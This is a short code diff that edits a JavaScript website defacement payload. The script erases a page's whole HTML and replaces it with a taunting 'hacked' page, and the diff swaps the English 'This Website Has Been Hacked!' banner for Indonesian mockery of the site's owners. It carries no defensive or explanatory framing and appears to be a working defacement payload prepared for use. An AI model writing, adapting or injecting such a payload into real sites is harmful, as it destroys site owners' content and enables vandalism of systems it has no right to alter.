@@ -4,7 +4,7 @@ document.documentElement.innerHTML = "";
 // Step 2: Add new HTML content
 document.documentElement.innerHTML = `
   <head>
-    <title>Hacked!</title>
+    <title>AwokAwokAwok</title>
     <style>
       body {
         margin: 0;
@@ -21,7 +21,7 @@ document.documentElement.innerHTML = `
   </head>
   <body>
     <div>
-      <h1>This Website Has Been Hacked!</h1>
+      <h1>EZ Banget Ya!</h1>
       <p>Minimal beli script. Sekolah Model tapi gak MODAL.</p>
     </div>
   </body>
